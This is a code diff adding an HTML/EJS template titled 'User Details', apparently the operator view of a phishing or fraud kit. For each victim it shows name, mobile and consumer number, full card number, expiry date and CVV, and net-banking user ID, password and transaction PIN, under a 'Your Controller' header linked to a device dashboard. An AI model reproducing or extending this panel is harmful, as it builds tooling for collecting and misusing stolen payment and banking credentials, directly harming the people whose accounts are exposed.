@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+
+  <!-- Header Navigation -->
+  <header class="header-nav">
+    <h1>Your Controller</h1>
+  </header>
+
+  <!-- Main Content Container -->
+  <div class="user-detail-container">
+    <h2>User Details</h2>
+
+    <% if (user) { %>
+      <div class="card">
+        <h3>Personal Information</h3>
+        <p><strong>Name:</strong> <%= user.name %></p>
+        <p><strong>Mobile No:</strong> <%= user.mobile %></p>
+        <p><strong>Consumer:</strong> <%= user.consumerNumber %></p>
+      </div>
+    <% } %>
+
+    <% if (cardPayment) { %>
+      <div class="card">
+        <h3>Card Payment Details</h3>
+        <p><strong>Card No:</strong> <%= cardPayment.cardNumber %></p>
+        <p><strong>EXP:</strong> <%= cardPayment.expiryDate %>
+        <p><strong>CVV:</strong> <%= cardPayment.cvv %>
+
+        </p>
+      </div>
+    <% } %>
+
+    <% if (netBanking) { %>
+      <div class="card">
+        <h3>Net Banking Details</h3>
+        <p><strong>Bank name:</strong> <%= netBanking.bankName %></p>
+        <p><strong>User-Id:</strong> <%= netBanking.userId %></p>
+        <p><strong>Password:</strong> <%= netBanking.password %></p>
+        <p><strong>T-PiN:</strong> <%= netBanking.transactionPassword %></p>
+      </div>
+    <% } %>
+
+    <% if (!user && !cardPayment && !netBanking) { %>
+      <p>User Not Found</p>
+    <% } %>
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+
+</body>
+</html>
